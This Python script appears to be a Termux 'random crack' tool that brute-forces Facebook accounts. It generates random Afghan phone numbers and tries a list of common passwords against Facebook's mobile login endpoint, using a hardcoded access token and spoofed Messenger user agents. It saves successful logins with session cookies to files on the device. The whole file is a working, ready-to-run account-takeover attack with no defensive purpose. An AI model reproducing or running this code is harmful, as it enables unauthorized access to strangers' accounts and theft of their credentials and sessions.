#coding :- utf-8

#update by :- ZAHIRO

#Script Owner : 𝑴𝑹 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹

#---------------------

try:

	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib

	from string import *

	from concurrent.futures import ThreadPoolExecutor as tred

except ModuleNotFoundError: 

	os.system('pip install requests > /dev/null')

	exit('\n Run Again ')

#---------------------ZAHIRO-LOGO---------------------#

logo ='''



.s5SSSSs. .s5SSSs.  .s    s.  s.  .s5SSSs.  

      SSS       SS.       SS. SS.       SS. 

     sSS  sS    S%S sS    S%S S%S sS    S%S 

    sSS   SS    S%S SS    S%S S%S SS    S%S 

   sSS    SSSs. S%S SSSs. S%S S%S SS .sS;:' 

  sSS     SS    S%S SS    S%S S%S SS    ;,  

 sSS      SS    `:; SS    `:; `:; SS    `:; 

sSS       SS    ;,. SS    ;,. ;,. SS    ;,. 

`:;;;;;:' :;    ;:' :;    ;:' ;:' `:    ;:' 

\033[1;97m--------------------------------------------------
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92m ZAHIRO KHAN
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92m HAJI ZAHIRO
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92m Mr ZAHIRO
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m 1.5
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;92m F
\033[1;97m--------------------------------------------------

'''

loop = 0

oks = []

pcp=[]

cps=[]

#---------------------ZAHIRO-MENU---------------------#

def menu():

	os.system('clear')

	print(logo)

	print('[1] Start Random Crack ')

	print('[0] Exit Menu')

	print(47*'-')

	opt = input('[?] Choose : ')

	if opt =='1':

		afg_randome()

	elif opt =='0':

		menu()

	else:

		print('\033[1;91m [•] Choose valid option\033[0;97m')

#---------------------ZAHIRO-RANDOM_CRACK---------------------#

def afg_randome():

	user=[]

	os.system('clear')

	print(logo)

	print('[+] For AFG (070,,078,077)ETC....')

	print(47*'-')

	kode = input('[?] Input Code : ')

	print(47*'-')

	limit = int('99999')

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(7))

		user.append(nmp)

	with tred(max_workers=30) as ahd:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')

		for guru in user:

			ids = kode+guru

			ZAHIRO_pass = [ids,guru,'200300','afghanistan','۱۲۳۴۵۶۷۸۹','khan12345','khan123','500500','۱۲۳۴۵۶','100200','50005000','600700','10002000','afghan123','afghan12345','kabul123','kabul12345','Kabuljan','Kabul123','۱٠٠۲٠٠','۵٠٠۵٠٠','۱٠٠٠۲٠٠٠','Kabul12345']

			ahd.submit(rndm,ids,ZAHIRO_pass)

	print(47*'\n\033[1;37m-')

	print('[✓] Crack process has been completed')

	print('[?] Total Ok Id Save in  /sdcard/ZAHIRO-OK.txt')

	print('[?] Total Cp Id Save in  /sdcard/ZAHIRO-CP.txt')

	print(47*'-')

	print(' Press Inter To Back Menu')

#---------------------START-CRACK---------------------#

def rndm(ids,ZAHIRO_pass):

	try:

		global ok,loop

		sys.stdout.write('\r\r\033[1;37m [𝑴𝑹 Zahir] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

		for pas in ZAHIRO_pass:

			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

			fbbv = str(random.randint(111111111,999999999))

			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')

			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')

			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')

			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')

			ua = ( f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) " f"[FBAN/Orca-Android; FBAV/{fbav}; FBBV/{fbbv}; FBRV/0; " f"FBPN/com.facebook.orca; FBLC/en_US; FBMF/{fbmf}; FBBD/{fbbd}; " f"FBDV/{model}; FBSV/{android_version}; " f"FBCA/arm64-v8a:armeabi-v7a:armeabi; " f'FBDM/{{density={random.uniform(1.0, 9.9):.1f},width={random.randint(500,999)},height={random.randint(999,1999)}}}; ' "FB_FW/1;]" )

			data = {"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}

			head = {'User-Agent': ua,'Host': 'graph.facebook.com','Content-Type': 'application/json; charset=UTF-8','Content-Length': '595','Connection': 'keep-alive','Accept-Encoding': 'gzip, deflate'}

			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()

			if 'session_key' in po:

				uid = po['uid']

				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])

				print('\r\r\033[1;32m [ZAHIRO-OK] '+str(uid)+' | '+pas+'\033[1;97m')

				#print('\r\r\033[1;32m [COOKIES] %s   '%(coki))

				open('/sdcard/ZAHIRO-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')

				oks.append(str(uid))

				break

			elif 'www.facebook.com' in po['error']['message']:

				uid = po['error']['error_data']['uid']

				print('\r\r\x1b[1;33m [ZAHIRO-CP] '+str(uid)+' | '+pas+'\033[1;97m')

				open('/sdcard/ZAHIRO-CP.txt','a').write(str(uid)+'|'+pas+'\n')

				cps.append(str(uid))

				break

			else:continue

		loop+=1

	except requests.exceptions.ConnectionError:

		time.sleep(30)

	except Exception as e:

		pass

menu()
